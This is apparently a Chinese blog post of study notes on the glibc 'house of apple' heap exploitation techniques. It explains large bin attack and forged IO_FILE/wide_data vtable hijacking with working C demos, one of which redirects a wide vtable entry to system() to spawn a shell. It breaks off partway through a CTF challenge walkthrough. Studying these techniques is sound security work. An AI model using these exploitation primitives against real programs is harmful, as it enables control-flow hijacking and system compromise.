---
title: 关于house of apple的学习总结
tags:
  - house of apple
  - FSOP
  - 伪造IO_FILE
  - orw
  - large bin attack
categories: 学习总结
abbrlink: 19609dd
---

### 前言：

`house of apple` 是 [roderick](https://roderickchan.github.io/) 师傅提出的一种非常优秀的 `IO` 攻击利用方法，应该在刚刚学习关于堆的漏洞时便看到 **roderick** 师傅提出的这种利用方法，当时看着文章上出现的很多不认识的名词感慨自己所了解的太少，时隔近七个月现在终于学习到了 `house of apple` 。而这篇文章仅仅是记录自己关于 `house of apple` 的学习总结，如果真正要进行对 `house of apple` 的学习还是建议去看 **roderick** 师傅发表的三篇文章。

**本文所有的 `glibc` 源代码均来自 `2.31` 版本**

### large bin attack：

`house of apple` 的攻击前提通常是使用 `large bin attack` ，因此需要先介绍一下 `glibc` 高版本中的 `large bin attack`。 `glibc` 低版本的 `large bin attack` 可以向任意两个地址写入两个堆地址，而高版本的 `large bin attack` 攻击效果是可以向任意一个地址写入一个堆地址。



漏洞源码如下：

下面代码位于 `ptmalloc` 遍历 `unsorted bin` 寻求合适堆块时将堆块分类，使堆块链入 `large bin ` 过程的代码片段

```c
else
{
	victim->fd_nextsize = fwd;
	victim->bk_nextsize = fwd->bk_nextsize;
	if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
	malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
	fwd->bk_nextsize = victim;
	victim->bk_nextsize->fd_nextsize = victim;
}
```



##### 漏洞原理：

这部分代码存在的问题在于 `victim->bk_nextsize = fwd->bk_nextsize;` `victim->bk_nextsize->fd_nextsize = victim;` 这两行代码中， `victim` 是将要被链入进 `large bin` 的堆块，而 `fwd` 是比 `victim` 大且位于同一个 `large bin` 的堆块，如果我们可以控制  `fwd->bk_nextsize` 为 `target_addr`（通过堆溢出或者 `UAF`），这样在 `victim->bk_nextsize->fd_nextsize = victim;` 执行时，就相当于是向 `target+0x20` 的位置写入 `victim`。因为 C语言 里访问结构体的成员本质上是通过偏移进行访问的，所以 `->fd_nextsize` 相当于 `+0x20`。



##### 利用过程：

1. 申请一个 `堆块A`，将其释放掉进入 `unsorted bin` ，再申请一个比 `堆块A` 大的 `堆块U` ,此时 `堆块A` 进入 `large bin`

2. 申请一个 `堆块B` ，将其释放进入 `unsorted bin` 。 `堆块B` 需要比 `堆块A` 小且二者需要位于同一个 `large bin` 中。

3. 利用 `堆溢出` 或者 `UAF` 等方式来篡改 `堆块A` 的 `bk_nextsize` 为 `target_addr-0x20`

4. 最后释放一个跟 `堆块A` 和 `堆块B` 位于同一个 `large bin` 且比 `堆块A` 和 `堆块B` 都大的 `堆块C`

5. 此时触发 `large bin attack` ，攻击效果是向 `target_addr` 中写入 `堆块B` 的地址

   举个例子，上述 `堆块A` `堆块B` `堆块C` `堆块U` 的大小可以分别为 `0x428` `0x418` `0x438` `0x438`



`poc`如下，该 `poc` 来自 [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c)

然后我把前面一部分翻译成了中文

```c
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*

A revisit to large bin attack for after glibc2.30

Relevant code snippet :

	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
	}


*/

int main(){
  /*Disable IO buffering to prevent stream from interfering with heap*/
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  printf("\n\n");
  printf("自glibc2.30以来，对大型bin块插入实施了两项新检查\n\n");
  printf("检查 1 : \n");
  printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
  printf("Check 2 : \n");
  printf(">    if (bck->fd != fwd)\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
  printf("这防止了传统的large bin attack\n");
  printf("然而，仍有一条可能的路径触发large bin attack。PoC如下所示： \n\n");
  
  printf("====================================================================\n\n");

  size_t target = 0;
  printf("以下是我们要覆盖的目标 (%p) : %lu\n\n",&target,target);
  size_t *p1 = malloc(0x428);
  printf("首先，我们分配一个大的块[p1] (%p)\n",p1-2);
  size_t *g1 = malloc(0x18);
  printf("另一个堆块防止合并\n");

  printf("\n");

  size_t *p2 = malloc(0x418);
  printf("我们还分配了第二个堆块 [p2]  (%p).\n",p2-2);
  printf("此堆块应小于[p1]，并属于同一个large bin.\n");
  size_t *g2 = malloc(0x18);
  printf("再次分配保护块以防止合并\n");

  printf("\n");

  free(p1);
  printf("释放两个-->[p1]中较大的一个 --> [p1] (%p)\n",p1-2);
  size_t *g3 = malloc(0x438);
  printf("分配大于[p1]的块以将[p1]插入large bin\n");

  printf("\n");

  free(p2);
  printf("释放两个-->[p2]中较小的一个 (%p)\n",p2-2);
  printf("此时, we have one chunk in large bin [p1] (%p),\n",p1-2);
  printf("               and one chunk in unsorted bin [p2] (%p)\n",p2-2);

  printf("\n");

  p1[3] = (size_t)((&target)-4);
  printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);

  printf("\n");

  size_t *g4 = malloc(0x438);
  printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
  printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
  printf("  the modified p1->bk_nextsize does not trigger any error\n");
  printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd->nexsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);

  printf("\n");

  printf("In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
  printf("Target (%p) : %p\n",&target,(size_t*)target);

  printf("\n");
  printf("====================================================================\n\n");

  assert((size_t)(p2-2) == target);

  return 0;
}
```

加载源码调试上面的 `poc` ，基本调试两遍就明白利用过程了。



##### 补充：

上述 `large bin attack` 的利用是最初在查找网上资料自学的时候看见的做法，但事实上有一个更简单的方法只需要两次进入 `large bin` 即可（上面的做法是一共用了三次进入 `large bin` 的堆块）。 

```c
              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert (chunk_main_arena (bck->bk));
                  if ((unsigned long) (size)
		      < (unsigned long) chunksize_nomask (bck->bk))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  ...
              }
```

`victim->fd_nextsize = fwd->fd;` 此处的 `fwd->fd` 指向的是唯一存在 `large bin` 中的堆块，漏洞在下面两行

```c
victim->bk_nextsize = fwd->fd->bk_nextsize;
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
```

依然是控制 `bk_nextsize` ，然后向 `bk_nextsize-0x20` 的位置写一个堆地址 `victim` 和上面利用一样，举个例子，可以先申请一个 `0x428` 的堆块进入 `large bin`，然后去篡改其 `bk_nextsize` ，再让一个 `0x418` 的堆块进入 `large bin` 即可触发 `large bin attack` 

`demo` 如下

```c
#include<stdio.h>
//Ubuntu GLIBC 2.35-0ubuntu3.1 
//gcc demo.c -o demo -g -w
char data[0x10];

int main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setvbuf(stderr, 0, 2, 0);
    printf("data address -------> %p\n",&data);//最终被写入数据的全局变量地址 
    printf("data value   -------> %s\n",data);//此时全局的内容为空 
    
	void *libc_base=&printf-0x60770;//获取libc基地址 
    printf("libc base address ------> %p\n",libc_base);


    char *p=malloc(0x428);
    malloc(0x10);
    char *p1=malloc(0x418);
    free(p);
    malloc(0x1000);
    printf("p chunk address--------> %p\n",p);
    *(long long int *)(p+0x18)=(long long int)&data-0x20;
    free(p1);
    malloc(0x1200);

    printf("data value -------> %s\n",data);
    return 0;
}
```

运行结果：

![image-20230201193929700](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302011939896.png)





### house of apple：

**roderick** 师傅发表了关于该手法的三篇文章，我这里的学习总结只记录前两篇文章。



#### house of apple1

##### 利用条件：

1. 可以泄露 `libc` 地址和堆地址 
2. 可以使用任意地址写一个堆地址（通常是使用 `large bin attack` ）
3. 从 `main` 函数返回或者调用 `exit` 函数



##### 攻击效果：

任意地址写一个堆地址（也可以是任意地址写一个其他地址，这个其他地址取决于伪造的 `IO_FILE`在哪里，通常是在堆上，所以是任意地址写一个堆地址）



##### 适用版本：

目前的所有 `libc` 版本，从 `2.23` 到目前最新的 `2.36`



##### 前置知识：

在 `IO_FILE` 中有一个成员变量 `_wide_data` ，该成员变量为一个结构体指针（如下）

```c
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data; 
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

 

该 `_IO_wide_data` 结构体定义如下,它是宽字节流的数据结构，用于处理宽字符的输入输出。

```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```



而在这个结构体中有一个 `_wide_vtable` ，里面存放的也都是函数指针 （如下）

```c
const struct _IO_jump_t _IO_wstrn_jumps libio_vtable attribute_hidden =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

这里需要强调一下 `_IO_jump_t` 和 `_IO_wstrn_jumps` 的关系

`_IO_wstrn_jumps` 和 `_IO_jump_t` 是glibc中两种不同类型的结构体,它们是相关的。

`_IO_jump_t`  是 `glibc` 中一个通用的结构体，用于实现文件流的多态性。它定义了一组函数指针，这些函数指针指向文件流的不同操作，如读写、定位、关闭等。而 `_IO_wstrn_jumps` 是 `_IO_jump_t` 的一个实例。它是用于实现宽字符流的。它继承了 `_IO_jump_t` 的所有函数指针，并定义了一些额外的函数指针，用于支持宽字符流的特殊操作。

回顾一下 `_IO_jump_t` 结构体 （如下）， `vtable` 是它的一个实例。此处需要理解清楚这些结构体之间彼此的关系。

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```



##### 漏洞原理：

而 `house of apple1` 中利用的漏洞位置位于 `_IO_wstrn_jumps` 结构体中的函数指针指向的 `_IO_wstrn_overflow` ,该函数源码如下

```c
static wint_t
_IO_wstrn_overflow (FILE *fp, wint_t c)
{
  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;

  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)
    {
      _IO_wsetb (fp, snf->overflow_buf,
		 snf->overflow_buf + (sizeof (snf->overflow_buf)
				      / sizeof (wchar_t)), 0);

      fp->_wide_data->_IO_write_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;
      fp->_wide_data->_IO_read_end = (snf->overflow_buf
				      + (sizeof (snf->overflow_buf)
					 / sizeof (wchar_t)));
    }

  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;
  fp->_wide_data->_IO_write_end = snf->overflow_buf;
  return c;
}
```

这个函数是宽字符流的溢出处理函数，当宽字符缓冲区已满，需要将数据写入指定位置（文件或者终端）时，该函数会被调用。

关于上面的代码首先要做一个简单的分析

1. `snf` 的地址和 `fp` 的地址相同 （也就是当前处理的这个 `IO_FILE` 的首地址）
2. `snf->overflow_buf` 相对于 `_IO_FILE` 结构体的偏移为`0xf0`，紧跟着在 `vtable` 后面
3. 正常情况下 `fp->_wide_data->_IO_buf_base != snf->overflow_buf` 这个条件是成立的。也就是 `if` 下的代码会被执行，完成下面的赋值操作

漏洞就是在赋值上面，因为没有关于 `fp->_wide_data` 的合法性检查，如果我们能够控制 `fp->_wide_data`，（以 `fp->_wide_data->_IO_write_base = snf->overflow_buf;` 这行代码为例）那就可以让 `snf->overflow_buf` 这个地址写入到 `fp->_wide_data->_IO_write_base`  上，而通过结构体指针操作符 `->` 来访问结构体中的成员变量本质上也只是访问的一个指针加偏移而已。因此实际上完成的写入操作是将 `snf->overflow_buf` 地址写入到了 `fp->_wide_data` 地址加 `0x20` 处，**完成了一次任意地址写一个不可控地址（这个不可控地址是 `overflow_buf` 的地址，不过通常我们伪造的 `IO_FILE` 在堆上，所以这个地址通常是个堆地址）**，之后还有几次赋值操作，原理依然如上。



自己写了一个 `demo` 如下

```c
//Ubuntu GLIBC 2.35-0ubuntu3.1 
// gcc demo.c -o demo -g -w

#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>
char data[0x10];

int main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setvbuf(stderr, 0, 2, 0);
    printf("data address -------> %p\n",&data);//最终被写入数据的全局变量地址 
    printf("data value   -------> %s\n",data);//此时全局的内容为空 
    
	void *libc_base=&printf-0x60770;//获取libc基地址 
    printf("libc base address ------> %p\n",libc_base);


    void *p=malloc(0x100);//该堆块就是用来伪造IO_FILE的 
    printf("Forged IO_ File address--------> %p\n",p);
    
    long long int _IO_wstrn_jumps =libc_base+0x215dc0;//获取_IO_wstrn_jumps的地址 
    long long int *vtable=p+0xd8;//获取伪造的IO_FILE的地址 


    long long int io_stdin=libc_base+0x219aa0;//获取_IO_2_1_stdin_结构体的地址 
    *(long long int *)(io_stdin+0x68)=(long long int)(p);
	//该攻击的第一步，需要先将伪造的IO_FILE添加到_IO_list_all中
	//我这里选择了篡改_IO_2_1_stdin_中的_chain字段，将其改为伪造的IO_FILE 
	 
    
    *(vtable)=_IO_wstrn_jumps;//该攻击的第二步，将IO_FILE中的vtable改成 _IO_wstrn_jumps的地址 
    
    *(long long int*)(p+0xa0)=(long long int)(data-0x18);
	//攻击第三步，将伪造的_IO_FILE中的_wide_data字段改为目标地址
	//触发攻击时就会向目标地址加0x18 0x20等等位置写入snf->overflow_buf的地址
	//这里我提前将目标地址减了0x18，在触发攻击时，就可以直接向目标地址写入snf->overflow_buf的地址了 
    
    //下面两行代码是为了绕过检查，触发overflow函数，分别将write_base设置为0 write_ptr设置为1
	//需要注意的是本来还需要伪造_mode字段为0，但是通常在堆块上这个字段默认是0
	//所以下面就没有伪造，但并不意味这_mode字段不需要伪造 
    *(long long int*)(p+0x28)=(long long int)(1);
    *(long long int*)(p+0x20)=(long long int)(0);

    fcloseall();//触发攻击 
    printf("data value -------> %s\n",data);//最后打印data的内容，发现原本内容是空的data变成了snf->overflow_buf的地址 
    return 0;
}

```



输出结果：

![image-20230512192939734](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121929997.png)

因为上图中最后的 `data value` 是个地址，存在不可见字符，实际值如下

![image-20230512193409832](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121934919.png)



上述便是 `house of apple1` 的学习总结，该攻击并不能直接获取 `shell ` ，通常情况下是只能向几个地址里写入一个堆地址。但是通过对于 `house of apple1` 的学习让我体会到了一种新型的攻击思路，个人感觉最好的状态就是先看文章学习，最后根据自己的理解写一个 `demo` ，只要 `demo` 没有成功触发攻击就说明自己还有地方没理解，当 `demo` 成功触发攻击时，就说明自己的理解是正确的。



#### house of apple2

##### 利用条件：

1. 可以泄露 `libc` 地址和堆地址 
2. 可以使用任意地址写一个堆地址（通常是使用 `large bin attack` ）
3. 从 `main` 函数返回或者调用 `exit` 函数

##### 攻击效果：

控制程序的执行流



##### 适用版本：

目前的所有 `libc` 版本，从 `2.23` 到目前最新的 `2.36`



##### 前置知识：

在 `2.23` 的 `libc` 版本中，我们是可以劫持 `vtable` ，从而替换其中的函数指针来控制程序的执行流，但是在之后的 `libc` 版本中，都对 `vtable` 进行了合法性检查,判断 `vtable` 地址是否在一个合法的区间里。但这不意味着无法伪造 `vtable` 了，目前如果将 `vtable` 原本存放的 `_IO_jump_t` 改成 `_IO_wfile_jumps` 依然是可以通过检查的。（ **roderick** 师傅说只要是 `jumps` 都满足检测 ）（在 `house of apple1` 中我们是将 `_IO_jump_t` 改成了 `_IO_wstrn_jumps`）



`_IO_wfile_jumps` 结构体如下

```c
const struct _IO_jump_t _IO_wfile_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_wfile_jumps)
```

还记得我们之前通常都是劫持 `exit` 函数中的这个 `_IO_OVERFLOW` 么，`house of apple2` 有多个 `IO` 利用链，这里我只总结从这个 `_IO_OVERFLOW` 触发的利用链。



##### 漏洞原理

假设我们现在将原本 `vtable` 中的 `_IO_jump_t` 结构体地址改成 `_IO_wfile_jumps` ,那么本应去调用 `__overflow` 函数不会被执行，而是去调用 `_IO_wfile_jumps` 中的 `_IO_wfile_overflow` 函数。

这里分析下 `_IO_wfile_overflow` 函数

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
	  _IO_free_wbackup_area (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	}


    }
......
}
libc_hidden_def (_IO_wfile_overflow)
```

我们的目的是要调用到 `_IO_wdoallocbuf` 函数，至于需要绕过的检查后面再总结。



`_IO_wdoallocbuf` 函数源码如下

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```



`_IO_WDOALLOCATE (fp)` 这里就是我们最后劫持程序执行流的地方，它是这样被调用的 `_wide_data->_wide_vtable->doallocate` 。这个函数最终也是通过 `vtable` 被调用的，但这个是 `_wide_data` 结构体中的 `_wide_vtable` 所调用的，由于没有合法性检测，就可以伪造这个 `vtable`。



再来回顾下上面提到的 `_wide_vtable` 结构体 ,可以看到这个 `doallocate` 位于偏移 `0x68` 的位置。因此我们只需要让伪造的这个 `vtable` 加 `0x68` 的位置为 `system` 函数即可。接下来想获取 `shell` ，只需要控制参数即可。

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```



发现最终执行的是 `_IO_WDOALLOCATE (fp)` ,而这个 `fp` 就是 `IO_FILE`，因此控制参数的话只需要让 `flags` 字段为 `/bin/sh` 。

总结下执行到最后的位置需要绕过的检查

1. `_flags` 设置为`~(2 | 0x8 | 0x800)` ，如果是需要获取 `shell` 的话，那么可以将参数写为 `  sh;` 这样 `_flags` 既能绕过检查，又能被 `system` 函数当做参数成功执行。需要注意的是 `sh;` 前面是有两个空格的（这个值是 `0x3b68732020` ）
2. `_wide_data->_IO_write_base` 设置为 `0` , `fp->_wide_data->_IO_buf_base` 设置为 `0` 
3. `fp->_mode == 0` 和 `fp->_IO_write_ptr > fp->_IO_write_base`  ,这样即可触发 `_IO_OVERFLOW`。

上面提到的是绕过的检查所需要伪造的字段，然后还有几个地方的设置如下

1. 将 `IO_FILE` 中的 `vtable` 字段改为 `_IO_wfile_jumps`
2. 将 `IO_FILE` 中的 `wide_data` 设置为可控堆地址，目的是控制 `wide_data` 中的 `write_base` 和 `buf_base` 为0
3. 控制 `wide_data->wide_vtable` 为地址 `A`，地址 `A` 满足 `*(A+0x68) == system` （此处的 `system` 地址是自己布置的）





自己写了一个 `demo`  如下

```c
//Ubuntu GLIBC 2.35-0ubuntu3.1 
// gcc demo.c -o demo -g -w
#include<stdio.h>
int main()
{
	setbuf(stdout, 0);
    setbuf(stdin, 0);
    setvbuf(stderr, 0, 2, 0);
	long long int libc_base=&printf-0x60770;
	printf("libc_base --------> %llx\n",libc_base);
	long long int stderr_address=libc_base+0x21a6a0;
	printf("stderr address --------> %llx\n",stderr_address);
	long long int wide_data=stderr_address+0xa0;
	printf("wide_data --------> %llx\n",wide_data);
	long long int vtable=stderr_address+0xd8;
	printf("vtable --------> %llx\n",vtable);
	
	long long int io_wfile_jumps=libc_base+0x2160c0;
	long long int wide_data_write_base=*(long long int *)(wide_data)+0x18;
	long long int wide_data_buf_base=*(long long int *)wide_data+0x30;
	printf("io_wfile_jumps --------> %llx\n",io_wfile_jumps);
	printf("wide_data_write_base --------> %llx\n",wide_data_write_base);
	printf("wide_data_buf_base --------> %llx\n",wide_data_buf_base);


	long long int wide_vtable=libc_base+0x219980;
	printf("wide_vtable --------> %llx\n",wide_vtable);
	long long int system=libc_base+0x50d60;
	long long int write_base=stderr_address+0x20;
	long long int buf_base=stderr_address+0x38;
	long long int system_ptr=wide_vtable-8;

	*(long long int *)vtable=io_wfile_jumps;
	*(long long int *)write_base=0;
     *(long long int *)wide_data_write_base=0;
     *(long long int *)wide_data_buf_base=0;
	*((long long int *)system_ptr)=system;
	*(long long int *)wide_vtable=libc_base+0x219910;
	*(long long int *)stderr_address=0x3b68732020; //~(2 | 0x8 | 0x800);
	exit(0);
}

```

输出结果：

![image-20230130171112854](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301301711064.png)



#### 题目练习

题目是 **roderick** 师傅在 `house of apple` 文章中的例题，下载链接在这里：https://pan.baidu.com/s/1nZIeYKqv619jMFyox-s8gQ?pwd=632r  提取码：632r
**roderick** 师傅说这个题是 `2.34` 的 `libc` ，我是直接拖到了 `22.04` 的 `ubuntu` 里，用 `2.35` 的 `libc` 打的。



##### 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930803.png" alt="image-20230202093006528" style="zoom: 67%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020930552.png" alt="image-20230202093028442" style="zoom:50%;" />

##### 程序分析

程序最开始先询问了一个 `key`，这个 `key` 决定了我们申请堆块的大小。

![image-20230202093211719](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020932796.png)

上面的代码说明 `key` 实际的范围是 `0x660 ~ 0xaa0`



然后有四个功能分别是 `add` `delete` `read` `write` （如下）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020934204.png" alt="image-20230202093401108" style="zoom:50%;" />



`add` 函数中只能选择三种大小的堆块申请，分别是 `key` `key+0x10` `2*key` ，并且只能 `add` 函数只负责申请堆块，无法向申请的堆块写入数据，最多能创建 `0x10` 个堆块。



`delete` 函数存在一个 `UAF` 漏洞，如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020938907.png" alt="image-20230202093807826" style="zoom:50%;" />

`read` 和 `write` 函数就是一个用于向堆块正常写入数据（没有溢出），一个可以打印堆块中 `0x10` 的数据（使用的 `write` 函数不会被 `\x00` 截断），然后各自只能执行一次



##### 利用思路

这里只记录使用 `house of apple2` 的攻击手法，在 `house of apple1` 中 **roderick** 师傅展示了另一种的攻击方式（不过个人感觉没有 `apple2` 的利用简单），下面说一下整体的利用思路，至于具体布局结构体的细节还需要做题时自己用 `gdb` 一点一点调试出来。

###### 泄露 `libc` 和 `heap` 地址 

因为只有一次 `write` 函数执行的机会，让堆块进入 `large bin` 中泄露两个地址是不可行的，因为用的是 `write` 打印出来的前 `0x10` 个字节都是 `libc` 地址。如果让 `unsorted bin` 中有两个堆块（不能合并），去打印 `unnsorted bin` 中的堆块就能用 `0x10` 的数据泄露出 `libc` 地址和堆地址了。

###### large bin attack

